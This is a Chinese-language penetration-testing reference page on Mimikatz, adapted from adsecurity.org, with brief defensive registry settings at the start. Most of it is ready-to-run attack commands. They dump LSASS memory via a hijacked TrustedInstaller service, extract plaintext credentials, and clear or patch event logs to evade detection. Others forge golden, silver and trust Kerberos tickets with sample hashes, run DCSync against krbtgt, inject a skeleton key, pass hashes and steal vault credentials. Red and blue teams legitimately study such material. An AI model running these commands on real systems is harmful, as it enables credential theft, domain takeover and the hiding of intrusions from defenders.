# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？ 想要在HackTricks中看到您的**公司广告**？ 或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) **Discord群**](https://discord.gg/hRep4RUj7f) 或 **电报群**](https://t.me/peass) 或在**Twitter**上**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

此页面内容来源于[adsecurity.org](https://adsecurity.org/?page\_id=1821)

## 内存中的LM和明文密码

从Windows 8.1和Windows Server 2012 R2开始，LM哈希和“明文”密码不再保存在内存中。

为了防止“明文”密码被放入LSASS，需要将以下注册表键设置为“0”（禁用摘要）：

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)_

## **Mimikatz和LSA保护:**

Windows Server 2012 R2和Windows 8.1包括一个名为LSA保护的新功能，涉及在Windows Server 2012 R2上启用[LSASS作为受保护进程](https://technet.microsoft.com/en-us/library/dn408187.aspx)（Mimikatz可以通过驱动程序绕过，但这应该会在事件日志中产生一些噪音）：

_LSA包括本地安全性机构服务器服务（LSASS）进程，用于验证本地和远程登录用户并执行本地安全策略。 Windows 8.1操作系统为LSA提供了额外的保护，以防止非受保护进程读取内存和注入代码。 这为LSA存储和管理的凭据提供了额外的安全性。_

启用LSA保护：

1. 打开注册表编辑器（RegEdit.exe），导航到位于以下注册表键的注册表键：HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa，并将注册表键的值设置为：“RunAsPPL”=dword:00000001。
2. 创建一个新的GPO，浏览到计算机配置，首选项，Windows设置。右键单击注册表，指向新建，然后单击注册表项。将显示新的注册表属性对话框。在Hive列表中，单击HKEY\_LOCAL\_MACHINE。在键路径列表中，浏览到SYSTEM\CurrentControlSet\Control\Lsa。在值名称框中，键入RunAsPPL。在值类型框中，单击REG\_DWORD。在值数据框中，键入00000001。单击确定。

LSA保护防止非受保护进程与LSASS交互。 Mimikatz仍然可以通过驱动程序绕过此设置（“!+”）。

[![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)

### 绕过已禁用的SeDebugPrivilege
默认情况下，通过本地安全策略，SeDebugPrivilege授予管理员组。在Active Directory环境中，[可以通过设置计算机配置 --> 策略 --> Windows设置 --> 安全设置 --> 本地策略 --> 用户权限分配 --> 定义为一个空组的调试程序](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5)来删除此特权。即使在离线AD连接设备上，也无法覆盖此设置，本地管理员在尝试转储内存或使用Mimikatz时将收到错误。

但是，TrustedInstaller帐户仍将具有访问权限以转储内存，并且[可以用于绕过此防御](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled)。通过修改TrustedInstaller服务的配置，可以运行该帐户以使用ProcDump并转储`lsass.exe`的内存。
```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```
[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

这个转储文件可以被转移到一个受攻击者控制的计算机，从中提取凭据。
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## 主要

### **事件**

**EVENT::Clear** – 清除事件日志\
[\
![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**EVENT:::Drop** – (_**实验性**_) 修补事件服务以避免新事件

[![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

注意:\
运行 privilege::debug 然后运行 event::drop 来修补事件日志。然后运行 Event::Clear 来清除事件日志，而不会记录任何已清除事件 (1102)。

### KERBEROS

#### 黄金票据

黄金票据是使用 KRBTGT NTLM 密码哈希来加密和签名的 TGT。

黄金票据 (GT) 可以被创建来冒充域中的任何用户（真实或虚构）作为域中任何组的成员（提供几乎无限的权限）访问域中的任何资源。

**Mimikatz 黄金票据命令参考:**

用于创建黄金票据的 Mimikatz 命令是 “kerberos::golden”

* /domain – 完全限定的域名。在此示例中: “lab.adsecurity.org”。
* /sid – 域的 SID。在此示例中: “S-1-5-21-1473643419-774954089-2222329127”。
* /sids – 附加的 SIDs 用于帐户/组在 AD 森林中具有您希望票据欺骗的权限。通常，这将是根域的企业管理员组 “S-1-5-21-1473643419-774954089-5872329127-519”。[此参数将提供的 SIDs 添加到 SID 历史参数中。](https://adsecurity.org/?p=1640)
* /user – 要冒充的用户名
* /groups (可选) – 用户是成员的组 RIDs（第一个是主要组）。\
添加用户或计算机帐户 RID 以获得相同的访问权限。\
默认组: 513,512,520,518,519 用于知名管理员组（下面列出）。
* /krbtgt – 用于加密和签名 TGT 的域 KDC 服务帐户 (KRBTGT) 的 NTLM 密码哈希。
* /ticket (可选) – 提供保存黄金票据文件的路径和名称以供以后使用，或使用 /ptt 立即将黄金票据注入内存供使用。
* /ptt – 作为 /ticket 的替代 – 使用此选项将伪造的票据立即注入内存供使用。
* /id (可选) – 用户 RID。Mimikatz 默认为 500（默认管理员帐户 RID）。
* /startoffset (可选) – 票据可用时的起始偏移量（通常设置为 -10 或 0 如果使用此选项）。Mimikatz 默认值为 0。
* /endin (可选) – 票据生存期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认的 Kerberos 策略设置为 10 小时（600 分钟）。
* /renewmax (可选) – 具有续订的最大票据生存期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认的 Kerberos 策略设置为 7 天（10,080 分钟）。
* /sids (可选) – 设置为 AD 森林中企业管理员组的 SID（\[ADRootDomainSID]-519）以欺骗整个 AD 森林中的企业管理员权限（在 AD 森林中的每个域中的 AD 管理员）。
* /aes128 – AES128 密钥
* /aes256 – AES256 密钥

黄金票据默认组:

* 域用户 SID: S-1-5-21\<DOMAINID>-513
* 域管理员 SID: S-1-5-21\<DOMAINID>-512
* 架构管理员 SID: S-1-5-21\<DOMAINID>-518
* 企业管理员 SID: S-1-5-21\<DOMAINID>-519（仅在伪造票据在 Forest 根域中创建时有效，但通过使用 /sids 参数添加以获得 AD 森林管理员权限）
* 策略创建者所有者 SID: S-1-5-21\<DOMAINID>-520
```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
[跨域的黄金票据](https://adsecurity.org/?p=1640)

#### 白银票据

白银票据是使用目标服务帐户的（通过SPN映射识别）NTLM密码哈希来加密和签名的TGS（格式类似于TGT）。

**创建白银票据的示例Mimikatz命令：**

以下Mimikatz命令为服务器adsmswin2k8r2.lab.adsecurity.org上的CIFS服务创建了一个白银票据。为了成功创建这个白银票据，需要发现adsmswin2k8r2.lab.adsecurity.org的AD计算机帐户密码哈希，可以通过AD域转储或在本地系统上运行Mimikatz（如上所示：_Mimikatz“privilege::debug”“sekurlsa::logonpasswords”退出_）来实现。NTLM密码哈希与/rc4参数一起使用。服务SPN类型还需要在/service参数中进行识别。最后，在/target参数中提供目标计算机的完全限定域名。不要忘记在/sid参数中提供域SID。
```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
#### [**Trust Ticket**](https://adsecurity.org/?p=1588)

确定了Active Directory信任密码哈希后，可以生成信任票据。信任票据是使用相互信任的2个域之间共享的密码创建的。\
[有关信任票据的更多背景信息。](https://adsecurity.org/?p=1588)

**转储信任密码（信任密钥）**
```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```
**使用Mimikatz创建伪造的信任票据（跨域TGT）**

伪造的信任票据将声明持有者是AD Forest中的企业管理员（利用Mimikatz中的SIDHistory，“sids”跨信任）。这将允许从子域到父域的完全管理访问。请注意，此帐户无需在任何地方存在，因为它实际上是跨信任的黄金票据。
```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```
### Trust Ticket Specific Required Parameters:

* \*\*/\*\*target – 目标域的完全限定域名。
* \*\*/\*\*service – 在目标域中运行的kerberos服务（krbtgt）。
* \*\*/\*\*rc4 – 服务kerberos服务账户（krbtgt）的NTLM哈希。
* \*\*/\*\*ticket – 提供保存伪造票证文件的路径和名称以供以后使用，或使用/ptt立即将黄金票证注入内存以供使用。

#### **更多KERBEROS**

**KERBEROS::List** – 列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。\
类似于“klist”的功能。

**KERBEROS::PTC** – 传递缓存（NT6）\
*Nix系统如Mac OS、Linux、BSD、Unix等缓存Kerberos凭据。这些缓存数据可以被复制并使用Mimikatz传递。也可用于在ccache文件中注入Kerberos票证。

Mimikatz的kerberos::ptc的一个很好的例子是在[利用MS14-068与PyKEK](https://adsecurity.org/?p=676)时。PyKEK生成一个ccache文件，可以使用kerberos::ptc将其与Mimikatz注入。

**KERBEROS::PTT** – 传递票证\
在找到[Kerberos票证](https://adsecurity.org/?p=1667)后，可以将其复制到另一台系统并传递到当前会话，有效地模拟登录而无需与域控制器通信。不需要特殊权限。\
类似于SEKURLSA::PTH（传递哈希）。

* /filename – 票证的文件名（可以是多个）
* /diretory – 目录路径，所有内部的.kirbi文件将被注入。

**KERBEROS::Purge** – 清除所有Kerberos票证\
类似于“klist purge”的功能。在传递票证（PTC、PTT等）之前运行此命令，以确保使用正确的用户上下文。

**KERBEROS::TGT** – 获取当前用户的当前TGT。

### LSADUMP

**LSADUMP**::**DCShadow** – 将当前计算机设置为DC，以便在DC内创建新对象（持久性方法）。\
这需要完整的AD管理员权限或KRBTGT密码哈希。\
DCShadow暂时将计算机设置为“DC”，用于复制目的：

* 在AD林配置分区中创建2个对象。
* 更新计算机的SPN，包括“GC”（全局目录）和“E3514235-4B06-11D1-AB04-00C04FC2DCD2”（AD复制）。有关Kerberos服务主体名称的更多信息，请参阅[ADSecurity SPN部分](https://adsecurity.org/?page\_id=183)。
* 通过DrsReplicaAdd和KCC将更新推送到DC。
* 从配置分区中删除创建的对象。

**LSADUMP::DCSync** – 请求DC同步对象（获取帐户的密码数据）\
[需要在域管理员、域管理员或自定义委派中的成员资格。](https://adsecurity.org/?p=1729)

2015年8月Mimkatz中添加的一个重要功能是“DCSync”，它有效地“冒充”域控制器，并从目标域控制器请求帐户密码数据。

**DCSync选项:**

* /all – DCSync获取整个域的数据。
* /user – 要获取数据的用户的用户ID或SID。
* /domain（可选）– Active Directory域的FQDN。Mimikatz将发现要连接的域中的DC。如果未提供此参数，Mimikatz将默认为当前域。
* /csv – 导出为csv
* /dc（可选）– 指定DCSync要连接并收集数据的域控制器。

还有一个/guid参数。

**DCSync命令示例:**

获取rd.adsecurity.org域中KRBTGT用户帐户的密码数据:\
_Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt” exit_

获取rd.adsecurity.org域中Administrator用户帐户的密码数据:\
_Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator” exit_

获取lab.adsecurity.org域中ADSDC03域控制器计算机帐户的密码数据:\
_Mimikatz “lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$” exit_

**LSADUMP::LSA** – 请求LSA服务器检索SAM/AD企业（正常、动态修补或注入）。使用/patch获取数据子集，使用/inject获取全部数据。_需要系统或调试权限。_

* /inject – 注入LSASS以提取凭据
* /name – 目标用户帐户的帐户名称
* /id – 目标用户帐户的RID
* /patch – 修补LSASS。

通常服务帐户是域管理员（或等效）的成员，或最近有域管理员登录到计算机，攻击者可以从中获取凭据。使用这些凭据，攻击者可以访问域控制器并获取所有域凭据，包括用于创建Kerberos黄金票证的KRBTGT帐户NTLM哈希。
```
mimikatz lsadump::lsa /inject exit
```
**LSADUMP::NetSync**

NetSync提供了一种简单的方法，使用DC计算机帐户密码数据来冒充域控制器，通过Silver Ticket并DCSync目标帐户的信息，包括密码数据。

**LSADUMP::SAM** – 获取SysKey以解密SAM条目（来自注册表或hive）。SAM选项连接到本地安全帐户管理器（SAM）数据库，并转储本地帐户的凭据。

**LSADUMP::Secrets** – 获取SysKey以解密SECRETS条目（来自注册表或hive）。

**LSADUMP::SetNTLM** – 请求服务器为一个用户设置新密码/ntlm。

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) – 请求LSA服务器检索信任Auth信息（正常或即时修补）。

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) – 将Skeleton Key注入到域控制器上的LSASS进程中。
```
"privilege::debug" "misc::skeleton"
```
### 权限

**PRIVILEGE::Backup** – 获取备份权限/权利。需要调试权限。

**PRIVILEGE::Debug** – 获取调试权限（对于许多 Mimikatz 命令，需要此权限或本地系统权限）。

### SEKURLSA

**SEKURLSA::Credman** – 列出凭据管理器

**SEKURLSA::Ekeys** – 列出**Kerberos加密密钥**

**SEKURLSA::Kerberos** – 列出所有经过身份验证用户的Kerberos凭据（包括服务和计算机帐户）

**SEKURLSA::Krbtgt** – 获取域Kerberos服务帐户（KRBTGT）密码数据

**SEKURLSA::SSP** – 列出SSP凭据

**SEKURLSA::Wdigest** – 列出WDigest凭据

**SEKURLSA::LogonPasswords** – 列出所有可用的提供程序凭据。通常显示最近登录的用户和计算机凭据。

* 为当前登录（或最近登录）的帐户以及以用户凭据上下文运行的服务转储密码数据。
* 帐户密码以可逆方式存储在内存中。如果它们在内存中（在 Windows 8.1/Windows Server 2012 R2 之前是这样的），它们将被显示。Windows 8.1/Windows Server 2012 R2 在大多数情况下不以这种方式存储帐户密码。KB2871997“回溯”了这种安全功能到 Windows 7、Windows 8、Windows Server 2008R2 和 Windows Server 2012，尽管应用 KB2871997 后计算机需要额外配置。
* 需要管理员访问权限（带有调试权限）或本地系统权限

**SEKURLSA::Minidump** – 切换到LSASS minidump进程上下文（读取 lsass 转储）

**SEKURLSA::Pth** – 传递哈希和超越传递哈希（又称传递密钥）。

_Mimikatz 可以执行众所周知的“传递哈希”操作，以使用用户密码的 NTLM 哈希而不是其真实密码在另一个凭据下运行进程。为此，它使用一个虚假身份启动一个进程，然后用真实信息（真实密码的 NTLM 哈希）替换虚假信息（虚假密码的 NTLM 哈希）。

* /user – 您想要模拟的用户名，记住管理员不是此众所周知帐户的唯一名称。
* /domain – 完全限定的域名 - 如果是本地用户/管理员，使用计算机或服务器名称、工作组或其他。
* /rc4 或 /ntlm – 可选 – 用户密码的 RC4 密钥 / NTLM 哈希。
* /run – 可选 – 要运行的命令行 - 默认为：cmd 以获得一个 shell。

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** – 列出所有最近经过身份验证用户的可用 Kerberos 票证，包括以用户帐户上下文和本地计算机的 AD 计算机帐户运行的服务。

与 kerberos::list 不同，sekurlsa 使用内存读取，不受密钥导出限制。sekurlsa 可以访问其他会话（用户）的票证。

* /export – 可选 – 票证以 .kirbi 文件导出。它们以用户的 LUID 和组号开始（0 = TGS，1 = 客户端票证(?) 和 2 = TGT）

类似于从 LSASS 转储凭据，使用 sekurlsa 模块，攻击者可以在系统内存中获取所有 Kerberos 票证数据，包括属于管理员或服务的票证。\
如果攻击者已经入侵了配置为 Kerberos 委派的 Web 服务器，用户通过后端 SQL 服务器访问该服务器，这将非常有用。这使攻击者能够在该服务器上捕获并重用所有用户票证的内存数据。

“kerberos::tickets” mimikatz 命令转储当前登录用户的 Kerberos 票证，不需要提升权限。利用 sekurlsa 模块从受保护的内存（LSASS）中读取的能力，可以转储系统上的所有 Kerberos 票证。

命令：_mimikatz sekurlsa::tickets exit_

* 转储系统上所有经过身份验证的 Kerberos 票证。
* 需要管理员访问权限（带有调试）或本地系统权限

### **SID**

Mimikatz SID 模块取代了 MISC::AddSID。使用 SID::Patch 来修补 ntds 服务。

**SID::add** – 将 SID 添加到对象的 SIDHistory 中

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** – 修改对象的 SID

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

Mimikatz Token 模块使 Mimikatz 能够与 Windows 认证令牌交互，包括获取和模拟现有令牌。

**TOKEN::Elevate** – 模拟一个令牌。用于将权限提升到 SYSTEM（默认）或使用 Windows API 在计算机上查找域管理员令牌。\
_需要管理员权限。_

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

在计算机上查找域管理员凭据并使用该令牌：_token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** – 列出系统的所有令牌

### **TS**

**TS::MultiRDP** – （实验性）修补终端服务器服务以允许多个用户

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)

**TS::Sessions** – 列出 TS/RDP 会话。

![](https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png)

### Vault

`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - 获取计划任务的密码

\
\
\\

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在 HackTricks 中看到您的**公司广告**吗？或者您想访问**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在 **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* 通过向 [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) 和 [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享您的黑客技巧。

</details>
